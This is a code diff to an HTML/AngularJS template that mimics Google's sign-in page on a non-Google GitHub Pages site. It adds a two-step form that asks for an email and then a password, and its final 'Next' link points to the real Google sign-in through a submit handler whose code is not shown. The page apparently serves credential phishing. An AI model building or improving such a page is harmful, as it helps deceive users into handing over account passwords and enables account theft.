@@ -6,7 +6,7 @@
 <div class="google container-fluid d-flex flex-column" style="min-height: 100vh">
     <div class="row flex-grow-1">
         <div class="col d-flex flex-column justify-content-center">
-            <div class="card">
+            <div class="card" ng-class="busy?'busy':''">
                 <div class="card-header">
                     <div style="height: 36px" class="d-flex align-items-center">
                         <svg xmlns="https://www.w3.org/2000/svg" width="14px" height="14px" viewBox="0 0 48 48"
@@ -27,28 +27,64 @@
                     </div>
                 </div>
                 <div class="card-body">
-                    <h1 style="margin-top: 4.5rem; " class="text-center sans mb-3">{{'Sign in' |translate}}</h1>
-                    <h5 style="font-size: 16px" class="text-center mb-5">
-                        {{'to continue to' | translate}} <a href="" ng-click="openModal()">paktusin.github.io</a>
-                    </h5>
-                    <div class="form-group">
-                        <input type="email" id="username" class="form-control" ng-model="username"
-                               autocomplete="username"/>
-                        <span class="placeholder">{{'Email or phone' | translate}}</span>
-                    </div>
-                    <div class="py-3">
-                        <a href="https://accounts.google.com/signin/v2/usernamerecovery">
-                            {{'Forgot email'|translate}}?
-                        </a>
-                    </div>
-                    <div style="margin-top: 32px">
-                        <p style="color:#5f6368">
-                            {{'google_access'|translate}}.
-                        </p>
-                    </div>
-                    <div class="pt-3 pb-5 mb-5 d-flex flex-row justify-content-end">
-                        <button class="btn btn-primary">{{'Next'|translate}}</button>
-                    </div>
+                    <form action="https://accounts.google.com/signin">
+                        <input type="hidden" autocomplete="false">
+                        <div ng-show="step === 0">
+                            <h1 style="margin-top: 4.5rem; " class="text-center sans mb-3">{{'Sign in' |translate}}</h1>
+                            <h5 style="font-size: 16px" class="text-center mb-5">
+                                {{'to continue to' | translate}} <a href=""
+                                                                    ng-click="openModal()">paktusin.github.io</a>
+                            </h5>
+                            <div class="form-group">
+                                <input type="text" id="username" class="form-control" ng-model="username"/>
+                                <div ng-click="pClick($event)" class="placeholder">{{'Email or phone' | translate}}
+                                </div>
+                            </div>
+                            <div class="py-3">
+                                <a href="https://accounts.google.com/signin/v2/usernamerecovery">
+                                    {{'Forgot email'|translate}}?
+                                </a>
+                            </div>
+                            <div style="margin-top: 32px">
+                                <p style="color:#5f6368">
+                                    {{'google_access'|translate}}.
+                                </p>
+                            </div>
+                            <div class="pt-3 pb-5 mb-5 d-flex flex-row justify-content-end">
+                                <button type="button" ng-click="next()" class="btn btn-primary">{{'Next'|translate}}
+                                </button>
+                            </div>
+                        </div>
+                        <div ng-show="step === 1">
+                            <h1 style="margin-top: 4.5rem; " class="text-center sans mb-3">{{'Welcome' |translate}}</h1>
+                            <div class="d-flex flex-row justify-content-center">
+                                <div class="user" ng-click="step=step-1">
+                                    <svg xmlns="https://www.w3.org/2000/svg" width="20px" height="20px"
+                                         viewBox="0 0 24 24"
+                                         fill="currentColor">
+                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
+                                        <path fill="none" d="M0 0h24v24H0V0z"></path>
+                                    </svg>
+                                    {{username}}
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <input type="password" id="password" class="form-control"
+                                       ng-model="password"/>
+                                <div ng-click="pClick($event)" class="placeholder">{{'Enter your password' | translate}}
+                                </div>
+                            </div>
+                            <div class="pt-5 pb-5 mb-5 d-flex flex-row justify-content-end">
+                                <a class="btn btn-light mr-auto"
+                                   href="https://accounts.google.com/signin/v2/usernamerecovery">
+                                    {{'Forgot password'|translate}}?
+                                </a>
+                                <a ng-click="submit($event)"
+                                   href="https://accounts.google.com/signin/v2/identifier?hl=ru&passive=true&continue=https%3A%2F%2Fwww.google.com%2F%3Fgws_rd%3Dssl&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+                                   class="btn btn-primary">{{'Next'|translate}}</a>
+                            </div>
+                        </div>
+                    </form>
                 </div>
             </div>
             <div class="d-inline text-right pt-2 pb-4 footer">
